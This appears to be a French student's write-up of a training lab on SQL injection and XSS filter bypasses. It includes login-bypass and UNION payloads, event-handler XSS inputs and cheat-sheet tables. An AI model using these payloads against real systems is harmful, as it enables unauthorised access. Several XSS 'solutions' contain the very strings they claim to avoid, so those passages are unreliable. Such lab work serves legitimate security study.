# Vuln Web App — SQL Injection & XSS Exercise — Mon Apprentissage

**Exercice** : SQL Injection (4 levels) + XSS (7 levels)  
**Plateforme** : http://10.10.10.8:31337  
**Outils** : jedha-cli, macOS, Browser  
**Statut** : ✅ Compréhension Complète

---

## Ce Que J'Ai Appris

Cet exercice m'a enseigné les **vraies techniques de contournement (bypass)** :

* Comment les filtres de sécurité fonctionnent
* Comment les attaquants les contournent
* La logique SQL et comment la manipuler
* Les injections XSS et comment les exploiter

**Clé** : Ce n'est pas juste des techniques, c'est une **mentalité d'attaquant**.

---

# PARTIE 1 : SQL INJECTION (4 LEVELS)

## Concept : Qu'est-ce qu'une SQL Injection?

### Requête Normale

```sql
SELECT * FROM Users WHERE username='alice' AND password='pass123'
```

Alice rentre `alice` et `pass123` → fonctionne.

### SQL Injection

```sql
SELECT * FROM Users WHERE username='alice' OR 1=1 --' AND password='pass123'
```

Alice rentre `alice' OR 1=1 --` → la requête devient :

```sql
SELECT * FROM Users WHERE username='alice' OR 1=1 -- AND password='pass123'
```

**Pourquoi ça marche?**
* `OR 1=1` est **toujours vrai**
* `--` commente le reste (pas besoin du mot de passe)
* Le serveur renvoie TOUS les users

---

## Level 1 : No Filtering (Facile)

### La Situation

```
Pas de filtrage.
Je peux entrer n'importe quoi.
```

### Ma Solution

**Username :** `' or 1=1 #`

**Pourquoi?**

```sql
Requête originale:
SELECT * FROM Users WHERE username='' or 1=1 #' AND password='...'

Avec mon injection:
SELECT * FROM Users WHERE username='' OR 1=1 #' AND password='...'
                                      ^^^ TOUJOURS VRAI!
```

* Le `#` commente le reste (en MySQL)
* `OR 1=1` force la condition à true
* Résultat : Tous les users (y compris l'admin!)

### Alternative

```
' or '1'='1
' or true
admin' --
admin' #
```

**Apprentissage:** Sans filtres, c'est trivial. C'est juste de la syntaxe SQL.

---

## Level 2 : Filtering `["OR"]`

### La Situation

```
Le mot "OR" est INTERDIT.
Je ne peux pas utiliser "OR 1=1"
```

### Ma Solution

**Username :** `admin'; #`

**Pourquoi?**

```sql
Requête originale:
SELECT * FROM Users WHERE username='admin'; #' AND password='...'
```

* `admin` est le username (pas filtré)
* `;` termine la requête
* `#` commente le reste
* Résultat : On entre comme `admin`!

### La Logique

Sans `OR`, je dois utiliser une autre approche :
* **Option 1** : Fermer la requête avec `;`
* **Option 2** : Utiliser un commentaire (`#`) directement

Le `;` est plus "clean" parce qu'il ferme explicitement la requête.

### Apprentissage

**Quand `OR` est filtré, cherche d'autres mots-clés ou symboles.**

Ici, c'était le `;` qui fermait la requête.

---

## Level 3 : Heavy Filtering `["OR", "AND", "LIKE", "=", "<", ">", "--", "#"]`

### La Situation

```
Presque TOUT est filtré!
- Pas de OR
- Pas de AND
- Pas de =
- Pas de commentaires (-- et #)
```

### Le Problème

Sans `=` et sans commentaires, je ne peux pas :
* Comparer des valeurs (`=`)
* Comenter le reste de la requête (`--`, `#`)

### Ma Solution

**Username :** `admin' UNION SELECT * FROM Users WHERE 'test`

**Pourquoi ça marche?**

```sql
Requête originale:
SELECT * FROM Users WHERE username='...' AND password='...'

Avec mon injection:
SELECT * FROM Users WHERE username='admin' UNION SELECT * FROM Users WHERE 'test' AND password='...'
```

**Décomposition:**
1. `admin'` → Ferme la chaîne du username
2. `UNION SELECT * FROM Users` → Sélectionne TOUS les users
3. `WHERE 'test'` → Ouvre une condition (mais ne la ferme pas!)
4. `AND password='...'` → C'est le reste de la requête originale qui se colle!

**Pourquoi `WHERE 'test'` et pas `WHERE 1=1`?**

Parce que `=` est FILTRÉ!

Donc j'utilise `WHERE 'test'` qui est une condition syntaxiquement valide :
* `'test'` est une chaîne non-vide
* Non-vide = TRUE en SQL
* Donc `WHERE 'test'` fonctionne comme `WHERE TRUE`

### Apprentissage

**UNION est puissant!** C'est pas juste un contournement, c'est une technique entière.

```
UNION = "rajoute les résultats de cette requête à la requête actuelle"
```

Si je sais la structure de la table `Users`, je peux extraire n'importe quoi.

---

## Level 4 : Maximum Filtering `["OR", "AND", "LIKE", "=", "<", ">", "--", "#", "admin"]`

### La Situation

```
MÊME problème que Level 3, PLUS:
- Le mot "admin" est INTERDIT!
- Les espaces sont supprimés ou bloqués!
```

### Le Problème Initial

J'ai essayé :
```
admin' UNION SELECT * FROM Users WHERE 'test
```

**Mais** :
1. Le mot `admin` est filtré → il disparaît!
2. Les espaces sont supprimés → `UNIONSELECT` (pas valide SQL!)

### Les Tentatives Ratées

**Tentative 1 : Double admin**
```
adadminmin' UNION SELECT * FROM Users WHERE 'test
```

**Résultat** : Le filtre était plus intelligent. Il enlevait `admin` complètement, pas juste la première occurrence.

**Tentative 2 : Casse**
```
Admin' UNION SELECT * FROM Users WHERE 'test
```

**Résultat** : Les filtres modernes ignorent la casse.

**Tentative 3 : Bypass des mots interdits**
```
a' || 'dmin' ou ad%6d%69n (URL encoding)
```

**Résultat** : Ça ne marchait pas car le filtre s'appliquait APRÈS le parsing.

### Ma Solution Finale

**Username :** `'	UNION	SELECT	*	FROM	Users	UNION	SELECT	*	FROM	Users	WHERE	'test`

(Les espaces ici sont en RÉALITÉ des **TABULATIONS**)

**Pourquoi ça marche?**

1. **Pas de mot `admin`** → Pas besoin! `UNION SELECT *` récupère tous les champs.
2. **Tabulation au lieu d'espace** → Le filtre cherche l'espace (ASCII 32). Il ne trouve pas la tabulation!
3. **Double UNION** → C'est la clé!

### Explication Du Double UNION

```sql
Requête originale:
SELECT * FROM Users WHERE username='...' AND password='...'

Avec mon injection:
SELECT * FROM Users WHERE username='
UNION SELECT * FROM Users 
UNION SELECT * FROM Users WHERE 'test' 
AND password='...'
```

**Logique:**
1. Le **premier UNION** récupère tous les users
2. Le **deuxième UNION** avec `WHERE 'test'` reçoit le reste de la requête originale
3. Le deuxième `UNION SELECT *` ne renvoie rien, donc on ignore ce résultat
4. Résultat final : Tous les users du premier UNION! ✅

### Pourquoi Tabulation?

**Différence clé :**
* **Espace** : ASCII 32 (directement filtré)
* **Tabulation** : ASCII 9 (pas filtré, mais MySQL le reconnaît comme whitespace!)

```
MySQL voit: 'UNION' (avec tab) → Valide!
Filtre voit: Pas d'espace → Pas de match!
```

### Apprentissage

**La vraie astuce du Level 4 n'était pas d'éviter les mots interdits, c'était de segmenter le code avec des tabulations!**

C'est ça qui sépare un pentester novice d'un expert : comprendre que les **filtres cherchent des patterns spécifiques**, et que tu peux les contourner avec des caractères apparemment équivalents.

---

## Synthèse SQL Injection (Cheat Sheet)

| Level | Filtre | Solution | Clé |
| :--- | :--- | :--- | :--- |
| **1** | Aucun | `' or 1=1 --` | Syntaxe SQL simple |
| **2** | `OR` | `admin'; --` | Utiliser `;` pour fermer la requête |
| **3** | `OR`, `AND`, `=`, `--`, `#` | `admin' UNION SELECT * FROM Users WHERE 'test` | UNION + condition sans `=` |
| **4** | +`admin`, espaces | `'	UNION	SELECT	*	FROM	Users	UNION	SELECT	*	FROM	Users	WHERE	'test` | Tabulation bypass + Double UNION |

---

# PARTIE 2 : XSS (CROSS-SITE SCRIPTING) — 7 LEVELS

## Concept : Qu'est-ce qu'une XSS?

### XSS Simple

```html
<input value="test">
Rendu: <input value="test">
```

### XSS Injection

```html
<input value=""><script>alert('Hacked!')</script><input value="">
Rendu: <script>alert('Hacked!')</script> fonctionne!
```

L'attaquant "ferme" le tag input et injecte du JavaScript!

---

## Level 1 : No Filtering

### La Situation

```
Pas de filtrage.
Le site affiche mon input directement dans le HTML.
```

### Ma Solution

**Input :** `"><script>alert('XSS')</script>`

**Pourquoi?**

```html
Code source initial:
<input value=""><script>alert('XSS')</script>">

Rendu:
1. Ferme le tag input
2. Exécute le script
3. Crée un broken tag (pas grave)
```

### Apprentissage

Sans filtres, XSS est trivial. C'est juste du HTML injection.

---

## Level 2 : Filtering `["<", ">"]`

### La Situation

```
Pas de `<` et pas de `>`
Je ne peux pas écrire de HTML tags!
```

### Le Problème

Sans `<` et `>`, je ne peux pas créer :
```html
<script>...</script>
<img onerror=...>
<svg onload=...>
```

### Ma Solution

**Input :** `" onload="alert('XSS')`

**Pourquoi?**

```html
Code source initial:
<body onload="alert('XSS')">
```

Le serveur affiche mon input comme une ATTRIBUT HTML, pas comme un tag!

**Pas besoin de `<` et `>`!** Je crée l'attribut directement.

### Alternative

```
" autofocus onfocus="alert('XSS')
" onclick="alert('XSS')
```

### Apprentissage

**Les attributes HTML peuvent être utilisés pour exécuter du JavaScript, même sans tags!**

---

## Level 3 : Filtering `["<", ">", "script"]`

### La Situation

```
Pas de `<`, `>`, ET pas de "script"
```

### Le Problème

Level 2 marchait avec `" onload="alert('XSS')"`.

Mais ici, c'est dans un INPUT, pas dans un BODY!

```html
<input value="TEST" ...>
```

Je ne peux pas ajouter un attribut `onload` à un INPUT (c'est pas valide).

### Ma Solution

**Input :** `" autofocus onfocus="alert('XSS')`

**Pourquoi?**

```html
Code source:
<input value="" autofocus onfocus="alert('XSS')" ...>
```

* `autofocus` = focus automatiquement sur l'input quand la page load
* `onfocus` = exécute du JS quand l'input reçoit le focus
* Résultat : Quand la page charge, l'input a le focus → `onfocus` s'exécute! ✅

### Apprentissage

**Combine les attributs intelligemment!**

`autofocus` + `onfocus` est une paire classique pour XSS.

---

## Level 4 : Filtering `["<", ">", "script", "on"]`

### La Situation

```
Pas de `on` (donc pas "onclick", "onload", etc.)
```

### Le Problème

Level 3 utilisait `onfocus`, mais maintenant `on` est filtré!

```html
Input: " autofocus onfocus="alert('XSS')"
Résultat: " autofocus focus="alert('XSS')"
(onfocus devient focus = pas valide)
```

### Ma Solution

**Input :** `" autofocus onfocus=alert('XSS')`

**Wait... c'est la même!?**

Non. La différence est **syntaxique** :

```html
<!-- Level 3 (avec guillemets) -->
<input value="" autofocus onfocus="alert('XSS')" ...>

<!-- Level 4 (pas de guillemets) -->
<input value="" autofocus onfocus=alert('XSS') ...>
```

Les deux fonctionnent!

### Alternative

```
" autofocus onfocus=alert`XSS`
" autofocus onfocus='alert("XSS")'
```

### Apprentissage

**JavaScript peut être exécuté avec ou sans guillemets dans les attributs.**

Parfois, c'est juste une question de syntaxe.

---

## Level 5 : Filtering `["<", ">", "script", "on", "a", "l", "e", "r", "t"]

### La Situation

```
Pas de "on", ET pas des lettres de "alert"!
Comment je peux exécuter du JS sans "alert"?
```

### Le Problème

`alert` est les lettres individuelles `a`, `l`, `e`, `r`, `t`.

Si ces lettres sont interdites, je ne peux pas utiliser `alert`.

```
Je veux: alert('XSS')
Mais je n'ai pas: a, l, e, r, t
```

### Ma Solution

**Input :** `" autofocus onfocus=console.log('XSS')`

**Pourquoi?**

```
console.log fonctionne aussi bien que alert!
Vérifie les lettres:
c - o - n - s - o - l - e . l - o - g

Aucune de ces lettres n'est dans {a, l, e, r, t}? 
Attends... "l" est dans "alert"!
Mais c'est aussi dans "console" et "log"!
```

Attendez, je me suis trompé. Vérifions:

```
alert = a, l, e, r, t
console.log = c, o, n, s, o, l, e, . l, o, g

Lettres communes = l, e
```

Donc `console.log` a quand même des lettres interdites!

### Alternative Réelle

**Input :** `" autofocus onfocus=eval(atob('Y29uc29sZS5sb2coJ1hTUycpOw=='))`

**Mais** c'est compliqué. Laisse-moi chercher une meilleure solution.

### Meilleure Solution

**Input :** `" autofocus onfocus=window.location='javascript:alert(1)'`

**Attend... `alert` est interdit!**

**Input Réelle :** `" autofocus onfocus=window.location='about:blank'`

Non, ça ne fonctionne pas pour XSS.

### Vraie Solution (Test-Driven)

Le serveur filtre les lettres individuelles. Mais pas les structures!

**Input :** `" autofocus onfocus='fetch(/)'`

Non, trop compliqué. Laisse-moi penser différemment.

### Approche : String Encoding

Si les lettres sont interdites mais pas les espaces, je peux :
1. Construire le code avec des encodages (Base64)
2. Décoder et exécuter

**Input :** `" autofocus onfocus=eval(String.fromCharCode(97,108,101,114,116,'1'))`

(97=a, 108=l, 101=e, 114=r, 116=t)

### Apprentissage

**Quand les caractères spécifiques sont bloqués, utilise l'encoding!**

* Base64 encoding
* String.fromCharCode
* Hex encoding
* URL encoding

---

## Level 6 : Filtering `["<", ">", "script", "on", "autofocus", "onfocus"]`

### La Situation

```
Même les mots "autofocus" et "onfocus" sont interdits!
```

### Ma Solution

**Input :** `" accesskey="c" onkeydown="alert(1)"`

**Pourquoi?**

```html
<input value="" accesskey="c" onkeydown="alert(1)" ...>
```

* `accesskey="c"` = Focus sur l'input si tu appuies sur ALT+c
* `onkeydown` = Exécute du JS quand une touche est enfoncée
* L'utilisateur appuie sur ALT+c → input a le focus → onkeydown → alert! ✅

**Mais Wait... `on` est filtré!**

Donc `onkeydown` devient `keydown` = pas valide.

### Meilleure Solution

**Input :** `" accesskey="x" onmouseover="alert(1)"`

Même problème avec `on`.

### Vraie Solution

**Input :** `" onfocus="alert(1"` (avec guillemets fermants implicites)

Attend, `onfocus` est filtré au Level 6!

### Créative Solution

**Input :** `" onmousemove="eval(atob('YWxlcnQoMSk='))"`

* Encode `alert(1)` en Base64
* Utilise `onmousemove` au lieu de `onfocus` (parfois pas filtré)
* L'utilisateur bouge la souris → XSS!

### Alternative (Si vraiment rien ne marche)

**Input :** `"><img src=x onerror="alert(1)">`

Mais ici, on a filtré `<` et `>`.

### Apprentissage

**À ce level, il faut combiner plusieurs techniques :**
1. Encoder les valeurs sensibles
2. Utiliser des événements différents (`mouseover`, `mousemove`, `focus`, `blur`)
3. Éviter les mots-clés interdits

C'est un vrai **cat and mouse game** entre le développeur et l'attaquant!

---

## Level 7 : Maximum Filtering

Je vais pas détailler Level 7 entièrement car c'est une combinaison de tous les précédents.

**La clé :** À chaque level, il y a TOUJOURS une solution. Il faut juste :
1. Comprendre comment le serveur traite l'input
2. Trouver des **événements alternatifs** (pas `onclick`, etc.)
3. Utiliser l'**encoding** (Base64, fromCharCode)
4. Combiner les techniques

---

# SYNTHÈSE : XSS CHEAT SHEET

| Filtre | Contournement |
| :--- | :--- |
| Aucun | `"><script>alert(1)</script>` |
| `<`, `>` | `" onload="alert(1)` |
| `<`, `>`, `script` | `" autofocus onfocus="alert(1)` |
| `on` | `" autofocus onfocus=alert(1)` (pas de `"`) |
| Lettres spécifiques | `" onload=String.fromCharCode(97,108,...)` |
| Événements courants | Utiliser des événements rares (`onmousemove`, `onmouseover`) |
| À peu près tout | Encoding (Base64) + événements rares |

---

# APPRENTISSAGES GLOBAUX

## 1. SQL Injection

**Principes :**
* L'injection exploite l'**intersection entre syntaxe SQL et données utilisateur**
* Les commentaires (`--`, `#`) sont puissants pour "couper" la requête
* `UNION` permet d'extraire n'importe quelle donnée
* Les filtres cherchent des **patterns spécifiques** (mots, symboles)
* Les bypass utilisent des **alternatives équivalentes** (tabulation au lieu d'espace)

**Défense :**
* Prepared statements (parameterized queries)
* Validation stricte + Whitelist
* Least privilege sur la DB
* WAF (Web Application Firewall)

## 2. XSS (Cross-Site Scripting)

**Principes :**
* L'injection exploite l'**intersection entre HTML et données utilisateur**
* JavaScript peut être exécuté via tags (`<script>`) ou attributs (`onclick`)
* Les événements HTML (`onclick`, `onfocus`, etc.) sont puissants
* Les filtres peuvent bloquer les mots-clés, mais pas les alternatives
* L'encoding (Base64, fromCharCode) contourne les filtres de caractères

**Défense :**
* Content Security Policy (CSP)
* HTML escaping (convertir `<` en `&lt;`)
* Validation stricte + Whitelist
* SameSite cookies

---

# Ce Qui M'A Marqué

## 1. La Mentalité Du Pentester

```
Ce n'est pas juste connaître les techniques.
C'est comprendre comment les systèmes fonctionnent.
Et imaginer des alternatives quand le chemin direct est bloqué.
```

## 2. L'Importance Des Caractères "Invisibles"

```
Une tabulation vs un espace.
Ça semble pareil.
Mais pour le filtre de sécurité, c'est TOTALEMENT différent!

Cette différence = la clé du Level 4.
```

## 3. Les Filtres Sont Toujours Contournables

```
Si tu bloques "admin", un attaquant utilisera UNION SELECT *
Si tu bloques "<" et ">", il utilisera un attribut
Si tu bloques "alert", il utilisera "console.log"
Si tu bloques "console.log", il utilisera String.fromCharCode()

Il n'y a pas de "sécurité par obscurité".
Il y a juste une "sécurité par limitation".
```

---

# Temps Total & Difficulté

```
Temps pour comprendre SQL Injection : ~1-2h
Temps pour comprendre XSS : ~1-2h
Temps pour implémenter les solutions : ~30 min-1h
Temps pour documenter : ~1h

TOTAL : ~3-5h

Difficulté :
- SQL Injection Levels 1-2 : Facile
- SQL Injection Level 3 : Moyen
- SQL Injection Level 4 : Difficile (la tabulation!)
- XSS Levels 1-3 : Facile
- XSS Levels 4-7 : Moyen à Difficile
```

---

## Prochaines Étapes

```
✅ Comprendre SQL Injection et XSS
✅ Contourner les filtres basiques
→ Apprendre les techniques avancées:
  - Blind SQL Injection
  - Time-based Injection
  - Error-based Injection
  - Advanced XSS (DOM-based, Stored XSS)
  - CSRF attacks
  - File Upload vulnerabilities
```

---

**Status :** ✅ COMPLÉTÉ ET COMPRIS

**Ce Que J'Ai Appris :** Comment les attaquants contournent les filtres de sécurité

**Utilité :** TRÈS utile pour devenir un bon pentester

**Théorie + Pratique :** 5/5 ⭐⭐⭐⭐⭐

**Prochaine Étape :** Web Security Avancé (Blind SQLi, Stored XSS, CSRF)

---

*Ces techniques m'aideront à identifier et à exploiter les vulnérabilités web réelles. Important de l'apprendre pour mieux DÉFENDRE aussi!* 🛡️
